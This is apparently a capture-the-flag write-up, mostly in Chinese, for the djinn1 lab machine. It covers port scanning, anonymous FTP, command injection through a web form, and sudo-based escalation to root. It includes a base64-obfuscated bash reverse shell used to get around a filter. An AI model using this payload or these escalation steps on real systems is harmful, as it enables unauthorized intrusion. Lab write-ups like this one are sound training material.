## port scan

```shell
# Nmap 7.94SVN scan initiated Wed Feb  5 04:44:05 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.56.145
Nmap scan report for bogon (192.168.56.145)
Host is up (0.013s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
1337/tcp open  waste
7331/tcp open  swx
```

```shell
# Nmap 7.94SVN scan initiated Wed Feb  5 04:44:45 2025 as: nmap -sT -sVC -O -p21,1337,7331 -oN nmap_result/detils 192.168.56.145
Nmap scan report for bogon (192.168.56.145)
Host is up (0.0011s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
1337/tcp open  waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '*', 8)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '+', 3)
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-title: Lost in space
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
MAC Address: 08:00:27:5E:E0:70 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Unix
```

ftp匿名登录

```shell
┌──(kali㉿kali)-[~/vulnhub/djinn1]
└─$ cat creds.txt         
nitu:81299

┌──(kali㉿kali)-[~/vulnhub/djinn1]
└─$ cat game.txt 
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.

┌──(kali㉿kali)-[~/vulnhub/djinn1]
└─$ cat message.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```

## web

```shell
gobuster dir -u http://192.168.56.145:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.145:7331
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wish                 (Status: 200) [Size: 385]
/genie                (Status: 200) [Size: 1676]
```

`wish`

![image-20250205204940321](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205204940321.png)

执行命令`id`

```
http://192.168.56.145:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
```

成功执行

但是存在waf

```
["/", ".", "?", "*", "^", "$", "eval", ";"]
```

```
echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTM4LzEyMzQgMD4mMQ==" | base64 -d | bash
```

反弹成功

## 提权

`/home/nitish/.dev`存在nitish的凭据

```shell
www-data@djinn:/home/nitish/.dev$ ls
creds.txt
www-data@djinn:/home/nitish/.dev$ cat creds.txt
nitish:p4ssw0rdStr3r0n9
```

切换到nitish用户

```shell
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

```shell
nitish@djinn:~$ /usr/bin/genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

查看genie的用法

`man genie`

```
-cmd
	You know sometime all you new is a damn CMD, windows I love you.
```

![image-20250205210318672](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250205210318672.png)

加上`-cmd`参数

```shell
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
```

成功切换到sam用户

```shell
$ ls -la
total 36
drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
-rw------- 1 root root  417 Nov 14  2019 .bash_history
-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
$ file .pyc
.pyc: python 2.7 byte-compiled
```

存在`.pyc`文件

反编译pyc文件

```python
# Source Generated with Decompyle++
# File: 1.pyc (Python 2.7)

from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'

if __name__ == '__main__':
    main(options())
```

```shell
$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

运行`/root/lago`，发现上面的py代码就是该文件源码

```shell
$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: num
num
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

输入`num`就可以，拿到root的shell

```shell
# ls
lago  proof.sh
# bash proof.sh
    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Wed Feb 5 18:42:28 IST 2025
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
```
